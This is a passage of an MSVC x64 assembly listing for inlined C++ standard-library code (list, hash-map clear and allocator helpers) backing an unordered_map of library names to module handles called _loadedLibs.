?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal, COMDAT

; 1854 :         return _Mypair._Get_first();

	mov	rax, rcx

; 1855 :     }

	ret	0
?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SA_KAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@@Z
_TEXT	SEGMENT
__formal$dead$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SA_KAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::max_size, COMDAT

; 714  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, 329406144173384850			; 0492492492492492H

; 715  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SA_KAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first, COMDAT

; 1508 :         return *this;

	mov	rax, rcx

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@SA_KAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@@Z
_TEXT	SEGMENT
__formal$dead$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@SA_KAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size, COMDAT

; 714  :         return static_cast<size_t>(-1) / sizeof(value_type);

	mov	rax, 2305843009213693951		; 1fffffffffffffffH

; 715  :     }

	ret	0
?max_size@?$_Default_allocator_traits@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@SA_KAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?clear@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
$T1 = 48
this$ = 48
?clear@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::clear, COMDAT

; 1147 :     void clear() noexcept {

$LN25:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 1148 :         // TRANSITION, ABI:
; 1149 :         // LWG-2550 requires implementations to make clear() O(size()), independent of bucket_count().
; 1150 :         // Unfortunately our current data structure / ABI does not allow achieving this in the general case because:
; 1151 :         //   (1) Finding the bucket that goes with an element requires running the hash function
; 1152 :         //   (2) The hash function operator() may throw exceptions, and
; 1153 :         //   (3) clear() is a noexcept function.
; 1154 :         // We do comply with LWG-2550 if the hash function is noexcept, or if the container was empty.
; 1155 :         const auto _Oldsize = _List._Mypair._Myval2._Mysize;

	mov	rcx, QWORD PTR [rcx+16]

; 1156 :         if (_Oldsize == 0) {

	test	rcx, rcx
	je	SHORT $LN1@clear

; 1157 :             return;
; 1158 :         }
; 1159 : 
; 1160 :         if constexpr (_Nothrow_hash<_Traits, key_type>) {
; 1161 :             // In testing, hash<size_t>{}(size_t{}) takes about 14 times as much time as assigning a pointer, or
; 1162 :             // ~7-8 times as much as clearing a bucket. Therefore, if we would need to assign over more than 8 times
; 1163 :             // as many buckets as elements, remove element-by-element.
; 1164 :             if (bucket_count() / 8 > _Oldsize) {

	mov	rax, QWORD PTR [rbx+56]
	mov	rdx, QWORD PTR [rbx+8]
	shr	rax, 3
	cmp	rax, rcx
	jbe	SHORT $LN3@clear

; 1165 :                 const auto _Head = _List._Mypair._Myval2._Myhead;
; 1166 :                 _Unchecked_erase(_Head->_Next, _Head);

	mov	r8, rdx
	mov	rcx, rbx
	mov	rdx, QWORD PTR [rdx]

; 1174 :     }

	add	rsp, 32					; 00000020H
	pop	rbx

; 1165 :                 const auto _Head = _List._Mypair._Myval2._Myhead;
; 1166 :                 _Unchecked_erase(_Head->_Next, _Head);

	jmp	?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_erase
$LN3@clear:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1492 :         _Node::_Free_non_head(_Getal(), _My_data._Myhead);

	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >

; 1493 :         _My_data._Myhead->_Next = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	lea	r8, QWORD PTR $T1[rsp]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1493 :         _My_data._Myhead->_Next = _My_data._Myhead;

	mov	QWORD PTR [rax], rax

; 1494 :         _My_data._Myhead->_Prev = _My_data._Myhead;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rax+8], rax

; 1495 :         _My_data._Mysize        = 0;

	mov	QWORD PTR [rbx+16], 0

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	mov	rdx, QWORD PTR [rbx+32]
	mov	rcx, QWORD PTR [rbx+24]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR $T1[rsp], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1173 :         _STD fill(_Vec._Mypair._Myval2._Myfirst, _Vec._Mypair._Myval2._Mylast, _Unchecked_end());

	call	??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ; std::fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
$LN1@clear:

; 1174 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?clear@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::clear
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ PROC ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first, COMDAT

; 1508 :         return *this;

	mov	rax, rcx

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ENDP ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBAAEBMXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBAAEBMXZ PROC ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size, COMDAT

; 160  :         return _Mypair._Myval2._Myval2;

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 161  :     }

	ret	0
?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBAAEBMXZ ENDP ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
